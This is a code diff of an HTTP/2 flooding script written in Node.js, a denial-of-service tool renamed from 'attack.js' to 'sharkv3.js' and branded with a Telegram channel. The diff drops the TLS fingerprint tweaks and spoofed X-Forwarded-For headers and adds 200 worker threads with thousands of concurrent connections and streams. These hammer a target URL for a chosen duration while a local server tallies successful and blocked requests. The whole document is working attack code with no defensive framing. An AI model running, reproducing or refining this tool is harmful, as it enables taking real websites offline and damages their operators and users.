@@ -1,72 +1,115 @@
 const http2 = require('http2');
-const tls = require('tls');
-const { Worker, isMainThread, workerData } = require('worker_threads');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
+const readline = require('readline');
+const net = require('net');
 
-const THREADS = Math.min(14, cpus().length);
+const THREADS = 200;
+const CONNECTIONS_PER_THREAD = 100;
+const STREAMS_PER_CONNECTION = 100;
+const MAX_INFLIGHT = 3000;
+const WARMUP_TIME = 5000;
+
+let total = 0, success = 0, blocked = 0, rps = 0, maxRps = 0;
 
 if (isMainThread) {
-    if (process.argv.length < 4) {
-        console.error('Usage: node attack.js <target> <duration_secs>');
+    const [,, target, durationStr] = process.argv;
+    if (!target || !durationStr) {
+        console.log('Usage: node sharkv3.js <target> <duration_secs>');
         process.exit(1);
     }
 
-    const target = process.argv[2];
-    const duration = parseInt(process.argv[3]);
+    const duration = parseInt(durationStr);
 
-    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);
+    console.clear();
+    console.log('Warming up...');
 
-    for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, { workerData: { target, duration } });
+    setTimeout(() => {
+        console.clear();
+        console.log('SHARKV3 - T.ME/STSVKINGDOM');
+        console.log('===========================');
+
+        for (let i = 0; i < THREADS; i++) {
+            new Worker(__filename, { workerData: { target, duration } });
+        }
+
+        const server = net.createServer(sock => {
+            sock.on('data', buf => {
+                const msg = buf.toString();
+                if (msg === 'req') total++, rps++;
+                else if (msg === 'ok') success++;
+                else if (msg === 'err') blocked++;
+            });
+        });
+        server.listen(9999);
+
+        setInterval(() => {
+            maxRps = Math.max(maxRps, rps);
+            render();
+            rps = 0;
+        }, 1000);
+    }, WARMUP_TIME);
+
+    function render() {
+        readline.cursorTo(process.stdout, 0, 0);
+        readline.clearScreenDown(process.stdout);
+        console.log('SHARKV3 - T.ME/STSVKINGDOM');
+        console.log('===========================');
+        console.log(`total: ${total}`);
+        console.log(`max-r: ${maxRps}`);
+        console.log('===========================');
+        console.log(`succes: ${success}`);
+        console.log(`Blocked: ${blocked}`);
     }
+
 } else {
     const { target, duration } = workerData;
     const end = Date.now() + duration * 1000;
-    const url = new URL(target);
-
-    function createRawSession() {
-        const socket = tls.connect({
-            host: url.hostname,
-            port: 443,
-            servername: url.hostname,
-            ALPNProtocols: ['h2'],
-            rejectUnauthorized: false,
-            ciphers: 'GREASE:AES128-GCM-SHA256:AES256-GCM-SHA384',
-            sigalgs: 'rsa_pss_rsae_sha256:ECDSA+SHA256',
-            honorCipherOrder: true,
-        }, () => {
-            const client = http2.connect(target, {
-                createConnection: () => socket
-            });
-
-            client.on('error', () => {});
-            client.on('close', () => {});
-            flood(client);
-        });
-
-        socket.on('error', () => {});
-    }
+    const sock = net.connect(9999, '127.0.0.1');
+    const sendStat = msg => sock.write(msg);
 
     function flood(client) {
-        (async () => {
-            while (Date.now() < end) {
-                for (let i = 0; i < 1000; i++) {
-                    try {
-                        const req = client.request({
-                            ':method': 'GET',
-                            ':path': `/${Math.random().toString(36).slice(2)}?v=${Date.now()}`,
-                            'user-agent': 'Mozilla/5.0',
-                            'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
-                        });
-                        req.on('error', () => {});
-                        req.end();
-                    } catch (err) {}
-                }
-                await new Promise(r => setTimeout(r, 5));
+        const inflight = { count: 0 };
+
+        function shoot() {
+            if (Date.now() > end) return;
+            if (inflight.count > MAX_INFLIGHT) return setTimeout(shoot, 1);
+
+            try {
+                inflight.count++;
+                const req = client.request({ ':path': '/', ':method': 'GET' });
+                req.setNoDelay?.(true);
+                req.on('response', () => {
+                    inflight.count--;
+                    sendStat('ok');
+                });
+                req.on('error', () => {
+                    inflight.count--;
+                    sendStat('err');
+                });
+                req.end();
+                sendStat('req');
+            } catch {
+                inflight.count--;
+                sendStat('err');
             }
-            client.close();
-        })();
+
+            setImmediate(shoot);
+        }
+
+        for (let i = 0; i < STREAMS_PER_CONNECTION; i++) shoot();
     }
 
-    for (let i = 0; i < 60; i++) createRawSession();
+    function connectLoop() {
+        try {
+            const client = http2.connect(target);
+            client.on('error', () => {});
+            client.on('close', () => setTimeout(connectLoop, 100));
+            client.on('connect', () => flood(client));
+        } catch {
+            setTimeout(connectLoop, 250);
+        }
+    }
+
+    for (let i = 0; i < CONNECTIONS_PER_THREAD; i++) connectLoop();
 }
